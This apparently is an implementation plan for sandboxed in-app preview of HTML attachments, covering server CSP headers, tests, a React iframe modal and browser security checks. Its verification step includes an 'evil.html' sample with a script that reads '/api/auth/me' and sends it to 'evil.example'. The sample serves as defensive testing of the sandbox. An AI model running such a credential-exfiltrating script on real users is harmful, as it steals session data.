# HTML 附件在线预览（Tier 4 sandboxed inline）Implementation Plan

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** HTML 附件点击即在应用内沙箱预览（对标 GitHub HTML preview），脚本无法触碰 open-tag origin。

**Architecture:** 服务端 `safeDownloadHeaders` 新增 Tier 4——`text/html`/`application/xhtml+xml` 以 `inline` + CSP `sandbox`（unique opaque origin）返回；前端新 `AttPreview` 弹窗用 `<iframe sandbox src=url>` 渲染，服务端 CSP 与 iframe sandbox 属性双保险。Tier 1–3 行为零改动。

**Tech Stack:** TypeScript（server: node:http 原生路由；web: React 18 + vite）。测试：node:test via tsx。无新依赖。

**Spec:** `docs/superpowers/specs/2026-09-16-attachment-html-preview-design.md`

---

## 前置：worktree

按 AGENTS.md，非平凡改动在隔离 worktree 做：

- [ ] **Step 0.1:** 主仓库根目录运行 `npm run wt:add -- html-preview`，然后 `cd ../open-tag-html-preview`。后续所有路径相对该 worktree 根（与主 checkout 同构）。

## File Structure

| 文件 | 动作 | 职责 |
|---|---|---|
| `src/server/routes-api/attachments.ts` | Modify | `safeDownloadHeaders` 加 Tier 4 分支 + 顶部三层注释更新为四层 |
| `test/mimeXssGuard.unit.test.ts` | Modify | 改写 2 条被取代断言 + 头部 fix-contract 注释 + 新增 Tier 4 断言 |
| `web/src/AttPreview.tsx` | Create | HTML 附件预览弹窗（portal + Esc + sandboxed iframe） |
| `web/src/views/Chat.tsx` | Modify | `isHtmlDoc` helper、`AttCard` 分支、`ChannelFiles` 接线 |
| `web/src/styles.css` | Modify | `.att-preview-*` 类（仿 `lightbox-*`，571-576 行附近） |
| `web/src/locales/en.json` / `zh.json` | Modify | 新增 `chat.previewError` |
| `ARCHITECTURE.md` | Modify | codemap 若提及附件下载策略，三层→四层（Task 5 检查） |
| `docs/authorization.md` | Modify | hardening roadmap 若提及下载头，同步（Task 5 检查） |

---

### Task 1: 服务端 Tier 4（TDD——先改测试看它失败）

**Files:**
- Modify: `test/mimeXssGuard.unit.test.ts`
- Modify: `src/server/routes-api/attachments.ts:32-90`

- [ ] **Step 1.1: 改写测试——text/html 断言反转为 Tier 4**

将 58-64 行的测试整体替换为：

```ts
test("safeDownloadHeaders: text/html → inline + CSP sandbox (Tier 4, sandboxed HTML preview)", () => {
  // Supersedes the old "attachment + octet-stream" contract: the defense changed shape, not strength.
  // Scripts are blocked by CSP 'sandbox' (unique opaque origin — no access to same-origin
  // localStorage/cookies), external loads by default-src 'none'. Direct URL navigation and
  // iframe embedding are both covered (response-header CSP applies either way).
  const h = safeDownloadHeaders("text/html", "page.html");
  assert.equal(h["content-type"], "text/html",
    "Tier 4 keeps the declared content-type so the browser parses it as a document");
  assert.match(h["content-disposition"], /^inline;/,
    "Tier 4 is inline so the preview iframe renders instead of triggering a download");
  assert.match(h["content-security-policy"]!, /\bsandbox\b/,
    "CSP must include 'sandbox' — unique origin, scripts/forms/popups/top-nav all blocked");
  assert.match(h["content-security-policy"]!, /default-src 'none'/,
    "no external resource loads (scripts, sub-frames, XHR, tracking pixels)");
  assert.match(h["content-security-policy"]!, /style-src 'unsafe-inline'/,
    "inline styles must render for visual fidelity");
  assert.match(h["content-security-policy"]!, /img-src data:/,
    "embedded base64 images must render");
  assert.equal(h["referrer-policy"], "no-referrer",
    "token lives in the query string — never leak it as a referrer");
  assert.equal(h["x-content-type-options"], "nosniff");
});
```

- [ ] **Step 1.2: 改写测试——xhtml 断言反转为 Tier 4**

将 78-82 行的测试整体替换为：

```ts
test("safeDownloadHeaders: application/xhtml+xml → inline + CSP sandbox (Tier 4)", () => {
  const h = safeDownloadHeaders("application/xhtml+xml", "page.xhtml");
  assert.equal(h["content-type"], "application/xhtml+xml");
  assert.match(h["content-disposition"], /^inline;/);
  assert.match(h["content-security-policy"]!, /\bsandbox\b/);
  assert.match(h["content-security-policy"]!, /default-src 'none'/);
  assert.equal(h["referrer-policy"], "no-referrer");
});
```

- [ ] **Step 1.3: 更新文件头 fix-contract 注释（8-20 行）**

将三层描述段（`//   - safeDownloadHeaders() three-tier whitelist:` 起至 `Content-Disposition: attachment.`）替换为四层版本：

```ts
//   - safeDownloadHeaders() four-tier whitelist:
//       • SAFE_INLINE_TYPES (jpeg/png/gif/webp/pdf/audio/video): inline, no extra headers.
//       • SAFE_INLINE_WITH_CSP_TYPES (image/svg+xml): inline with declared MIME + CSP sandbox
//         (default-src 'none'; style-src 'unsafe-inline'; sandbox) so browser image elements
//         can render it but direct navigation is sandboxed (no script execution, unique origin).
//       • SANDBOXED_INLINE_TYPES (text/html, application/xhtml+xml): inline with declared MIME
//         + CSP sandbox (default-src 'none'; style-src 'unsafe-inline'; img-src data:; sandbox)
//         + referrer-policy: no-referrer. The sandbox directive gives the document a unique
//         opaque origin — scripts/forms/popups blocked, no same-origin data access — so HTML
//         preview is safe both in an iframe and on direct URL navigation (GitHub-preview model).
//       • Everything else (text/javascript, text/xml, …):
//         Content-Type: application/octet-stream + Content-Disposition: attachment.
```

保留 66-70 行 `text/javascript → attachment`、72-76 `application/javascript → attachment`、115-125 xml→attachment 等其余断言不动——Tier 4 只收编 html/xhtml 两个类型。顺手把 56 行段落头注释 `XSS-risky types → attachment + octet-stream` 改为 `javascript/xml → attachment + octet-stream`（html/xhtml 已迁出该段）。

注意：204-207 行 `nosniff on forced attachment type` 测试用 `text/html` 作输入，Tier 4 下它仍是 nosniff（新 Tier 4 断言已覆盖），该旧测试改名输入为 `text/javascript` 以保持"forced attachment"语义：

```ts
test("safeDownloadHeaders: x-content-type-options: nosniff on forced attachment type", () => {
  const h = safeDownloadHeaders("text/javascript", "evil.js");
  assert.equal(h["x-content-type-options"], "nosniff");
});
```

- [ ] **Step 1.4: 跑测试，确认新断言失败**

Run: `npx tsx --test --test-force-exit test/mimeXssGuard.unit.test.ts`
Expected: FAIL —— `safeDownloadHeaders: text/html → inline + CSP sandbox` 断言 `content-type` 得到 `application/octet-stream`（旧实现仍强制下载）。

- [ ] **Step 1.5: 实现 Tier 4**

`src/server/routes-api/attachments.ts`。在 `SAFE_INLINE_WITH_CSP_TYPES` 集合定义（48-50 行）之后新增：

```ts
/**
 * Tier 4 — HTML documents rendered in the sandboxed preview (GitHub-preview model).
 * text/html / application/xhtml+xml are served inline with a CSP sandbox: the document
 * gets a unique opaque origin (no access to this app's localStorage/cookies), scripts,
 * forms, popups and top-level navigation are blocked, and default-src 'none' cuts every
 * external load. style-src 'unsafe-inline' + img-src data: keep pages visually intact
 * (inline styles, embedded base64 images) without opening a network channel.
 * referrer-policy: no-referrer never leaks the ?token= query as a referrer.
 * Safe both inside the preview iframe and on direct URL navigation — the sandbox lives
 * in the response header, not the embedding context.
 */
const SANDBOXED_INLINE_TYPES = new Set<string>([
  "text/html", "application/xhtml+xml",
]);
const HTML_SANDBOX_CSP = "default-src 'none'; style-src 'unsafe-inline'; img-src data:; sandbox";
```

`safeDownloadHeaders` 内（66-90 行），在 SVG 分支（77-84 行）之后、兜底 return 之前插入：

```ts
  if (storedMime && SANDBOXED_INLINE_TYPES.has(storedMime)) {
    return {
      "content-type": storedMime,
      "content-disposition": `inline; filename*=UTF-8''${encodedName}`,
      "content-security-policy": HTML_SANDBOX_CSP,
      "referrer-policy": "no-referrer",
      ...nosniff,
    };
  }
```

同时把函数 doc comment（54-65 行）中的 "Three tiers:" 更新为 "Four tiers:"，并在第 2 条后补一行 ` *  3. SANDBOXED_INLINE_TYPES (html) → inline, declared MIME, CSP sandbox + no-referrer + nosniff.`，原第 3 条改为第 4 条。

- [ ] **Step 1.6: 跑测试，确认全绿**

Run: `npx tsx --test --test-force-exit test/mimeXssGuard.unit.test.ts`
Expected: PASS，全部 ~25 条（含改写后的 3 条 + 其余未动断言）。

- [ ] **Step 1.7: Commit**

```bash
git add src/server/routes-api/attachments.ts test/mimeXssGuard.unit.test.ts
git commit -m "feat(server): Tier 4 sandboxed inline for HTML attachments (CSP sandbox + no-referrer)"
```

---

### Task 2: `AttPreview` 组件 + 样式 + i18n

**Files:**
- Create: `web/src/AttPreview.tsx`
- Modify: `web/src/styles.css`（`.lightbox-x` 附近，576 行后）
- Modify: `web/src/locales/en.json`、`web/src/locales/zh.json`（`chat` 段）

- [ ] **Step 2.1: 新建 `web/src/AttPreview.tsx`**

```tsx
// HTML attachment preview: sandboxed iframe modal (GitHub-preview model). The server's
// Tier 4 response already carries a CSP sandbox (unique opaque origin); the iframe
// `sandbox` attribute (empty = maximum restrictions: no scripts, no same-origin, no
// forms, no popups) is the client-side half of the defense-in-depth pair. Esc/backdrop
// closes; the title bar keeps a download link for "open raw" workflows.
import { useEffect, useRef, useState } from "react";
import { createPortal } from "react-dom";
import { X } from "lucide-react";
import { IconDownload } from "./icons.tsx";
import i18n from "./i18n";

export function AttPreview({ url, filename, onClose }: { url: string; filename: string; onClose: () => void }) {
  const [err, setErr] = useState(false);
  const closeRef = useRef<HTMLButtonElement>(null);
  const prevFocus = useRef<HTMLElement | null>(null);
  useEffect(() => {
    prevFocus.current = document.activeElement instanceof HTMLElement ? document.activeElement : null;
    closeRef.current?.focus();
    const h = (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose();
      if (e.key === "Tab") { e.preventDefault(); closeRef.current?.focus(); }
    };
    window.addEventListener("keydown", h);
    return () => { window.removeEventListener("keydown", h); prevFocus.current?.focus(); };
  }, [onClose]);
  return createPortal(
    <div className="att-preview-bg" role="dialog" aria-modal="true" aria-label={filename} onClick={onClose}>
      <button ref={closeRef} className="lightbox-x" onClick={onClose} aria-label={i18n.t("chat.close")}><X size={20} /></button>
      <div className="att-preview-panel" onClick={(e) => e.stopPropagation()}>
        <div className="att-preview-bar">
          <span className="att-preview-name" title={filename}>{filename}</span>
          <a className="im" title={i18n.t("chat.download")} href={url} download={filename} target="_blank" rel="noreferrer"><IconDownload size={14} className="im-bounce-down" /></a>
        </div>
        {err
          ? <div className="att-preview-err">{i18n.t("chat.previewError")}</div>
          : <iframe className="att-preview-frame" src={url} sandbox title={filename} onError={() => setErr(true)} />}
      </div>
    </div>,
    document.body,
  );
}
```

- [ ] **Step 2.2: `web/src/styles.css` 追加（`lightbox-*` 块后）**

```css
/* HTML attachment preview modal (sandboxed iframe) */
.att-preview-bg{position:fixed;inset:0;z-index:200;background:var(--scrim);backdrop-filter:blur(2px);display:flex;align-items:center;justify-content:center;overflow:hidden;padding:32px}
.att-preview-panel{display:flex;flex-direction:column;width:min(92vw,1120px);height:calc(100vh - 64px);background:var(--surface);border:1px solid var(--hair-strong);border-radius:12px;box-shadow:0 12px 48px var(--shadow-7);overflow:hidden}
.att-preview-bar{display:flex;align-items:center;gap:8px;padding:8px 12px;border-bottom:1px solid var(--hair);flex-shrink:0}
.att-preview-name{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:13px;font-weight:600}
.att-preview-frame{flex:1;width:100%;border:none;background:#fff}
.att-preview-err{flex:1;display:flex;align-items:center;justify-content:center;color:var(--ink-2);font-size:14px}
```

- [ ] **Step 2.3: i18n 两份 locale 的 `chat` 段各加一键**

`en.json`：`"previewError": "Preview failed — download instead"`
`zh.json`：`"previewError": "预览失败，请下载查看"`

- [ ] **Step 2.4: typecheck**

Run: `cd web && npx tsc --noEmit`（或根目录 `npm run typecheck`）
Expected: PASS，无新错误。

- [ ] **Step 2.5: Commit**

```bash
git add web/src/AttPreview.tsx web/src/styles.css web/src/locales/en.json web/src/locales/zh.json
git commit -m "feat(web): AttPreview sandboxed-iframe modal for HTML attachments"
```

---

### Task 3: 接线 `AttCard` 与 `ChannelFiles`

**Files:**
- Modify: `web/src/views/Chat.tsx:32-33`（helper）、`79-88`（AttCard）、`863-887`（ChannelFiles）

- [ ] **Step 3.1: helper + import（isImage/isVideo 旁，33 行后）**

Chat.tsx 顶部 import 区（Lightbox 导入旁）加 `import { AttPreview } from "../AttPreview.tsx";`。

```ts
const isHtmlDoc = (m?: string) => m === "text/html" || m === "application/xhtml+xml";
```

判定**仅**认元数据 mimeType，不看扩展名——服务端按存储 mime 判级，误存 octet-stream 的 .html 服务端仍发下载头，iframe 不渲染且不触发 onError（空白弹窗陷阱）。前后端判定集合必须一致。

- [ ] **Step 3.2: `AttCard` 加 HTML 分支（79-88 行）**

组件内加 `const [pv, setPv] = useState(false);`，在 `isVideo` 分支后、兜底 `<a>` 前插入：

```tsx
  if (isHtmlDoc(a.mimeType)) return (<>
    <a className="msg-att" href={url} target="_blank" rel="noreferrer" onClick={(e) => { e.preventDefault(); setPv(true); }} title={a.filename}>
      <IconFile size={14} /><span className="grow">{a.filename}</span><span className="asz">{fmtSize(a.sizeBytes)}</span>
    </a>
    {pv && <AttPreview url={url} filename={a.filename} onClose={() => setPv(false)} />}
  </>);
```

保持 `<a>` 元素（中键/右键“新标签打开”仍直开原始 URL——Tier 4 下直开同样沙箱安全）。

- [ ] **Step 3.3: `ChannelFiles` 接线（~863-887 行）**

组件顶部加 `const [pv, setPv] = useState<{ id: string; filename: string } | null>(null);`；`file-main` 锚点（875 行）改为：

```tsx
<a className="file-main" href={attachmentUrl(f.id)} target="_blank" rel="noreferrer"
   onClick={(e) => { if (isHtmlDoc(f.mimeType)) { e.preventDefault(); setPv({ id: f.id, filename: f.filename }); } }}>
```

列表渲染后追加：`{pv && <AttPreview url={attachmentUrl(pv.id)} filename={pv.filename} onClose={() => setPv(null)} />}`

- [ ] **Step 3.4: typecheck**

Run: 根目录 `npm run typecheck`（root + web）
Expected: PASS。

- [ ] **Step 3.5: Commit**

```bash
git add web/src/views/Chat.tsx
git commit -m "feat(web): open HTML attachment preview from message bubbles and Files tab"
```

---

### Task 4: 浏览器安全验证（worktree 隔离栈）

前置：worktree 内 `npm run dev:e2e:up`（需 claude CLI 已认证； prints dev-login URL）。用 chrome-devtools MCP `--isolated`。

- [ ] **Step 4.1: 攻击样例不执行。** 构造 `evil.html`：

```html
<!DOCTYPE html><html><body>
<h1 style="color:red">preview ok</h1>
<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt="d">
<script>fetch('/api/auth/me').then(r=>r.text()).then(t=>fetch('https://evil.example/?d='+encodeURIComponent(t)))</script>
<img src="https://evil.example/pixel" onerror="fetch('https://evil.example/exfil')">
</body></html>
```

上传到测试频道（UI 或 curl `POST /api/attachments/upload`），消息里附加。点击附件卡片打开预览：
- Expected: 看到 "preview ok" 红字 + data: 图（样式/内嵌图生效）
- Expected: 脚本未执行、`/api/auth/me` 未被调用、`evil.example` 无实际流量。Console 里 CSP 拒绝执行日志（"Refused to execute…"）与 Network 的 blocked 条目**均属预期**——判据是请求未发出，不是零日志

- [ ] **Step 4.2: 直开 URL 同样安全。** 新标签页访问 `attachmentUrl(id)`：
- Expected: 文档渲染，脚本同样不执行（响应头 CSP 生效，与嵌入方式无关）

- [ ] **Step 4.3: 正常文档保真。** 上传带内联 CSS + base64 图的自包含报告页：
- Expected: 预览样式正确；外链 CSS 字体（如引用 CDN）**不加载**（default-src 'none'，设计如此——文档需自包含）

- [ ] **Step 4.4: 权限不变量。** 用另一个测试账号（非该私有频道成员）直开该附件 URL：
- Expected: 404（IDOR-B3 门未动）

- [ ] **Step 4.5: 非 HTML 类型不受影响。** 上传 .js 文件点击：
- Expected: 仍是下载卡，无预览弹窗

- [ ] **Step 4.6: `npm run dev:e2e:down`**

---

### Task 5: doc-sync + 收尾

- [ ] **Step 5.1:** `ARCHITECTURE.md` — codemap/边界若提及 `safeDownloadHeaders` 三层策略，更新为四层（含 Tier 4 一句）。若压根没提，不加（不为改而改）。
- [ ] **Step 5.2:** `docs/authorization.md` — 搜索 `attachment`/`octet-stream`：hardening roadmap 若列 "HTML 强制下载" 为防线，补注 Tier 4 沙箱形态（防线变形，强度不变）。
- [ ] **Step 5.3:** `FEATURES.md` 附件条目补 "HTML 在线预览（沙箱）" 勾选项。
- [ ] **Step 5.4:** 依赖变更检查：无新依赖（本次零 npm install）。不涉及 `src/daemon/**`——**无需 daemon 发版**。
- [ ] **Step 5.5:** 最终全量验证：`npx tsx --test --test-force-exit test/mimeXssGuard.unit.test.ts` + `npm run typecheck` 双绿。
- [ ] **Step 5.6: Commit + PR**

```bash
git add ARCHITECTURE.md docs/authorization.md FEATURES.md
git commit -m "docs: sync Tier 4 sandboxed HTML preview across codemap/authz/features"
gh pr create --fill --base main
```

PR 描述引用 spec 路径与安全验证结果（Task 4 证据）。

---

## 验证汇总（完成定义对齐 spec §⑤）

| 层 | 手段 |
|---|---|
| 单元 | mimeXssGuard 四 tier 全枚举绿 |
| 类型 | root + web typecheck 绿 |
| 真实运行 | Task 4 六步浏览器验证，证据（截图/Network 记录）贴 PR |
| 文档 | ARCHITECTURE / authorization / FEATURES 同 commit |
| 发版 | 不涉及 daemon，无发版步骤 |

**未验证即未完成**：任何一步跳过必须在 PR 里明示。
